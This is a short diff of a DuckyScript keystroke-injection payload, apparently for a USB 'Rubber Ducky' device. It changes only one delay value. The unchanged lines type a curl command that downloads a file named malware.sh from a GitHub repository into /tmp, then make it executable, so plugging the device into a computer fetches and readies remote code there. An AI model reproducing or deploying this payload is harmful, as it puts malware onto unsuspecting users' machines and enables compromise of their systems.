@@ -6,7 +6,7 @@ ENTER
 DELAY 1000
 STRING curl -L https://github.com/noahlgrd01/NoahSilentDucky/raw/main/malware.sh -o /tmp/malware.sh
 ENTER
-DELAY 000
+DELAY 60000
 STRING chmod +x /tmp/malware.sh
 ENTER
 DELAY 500
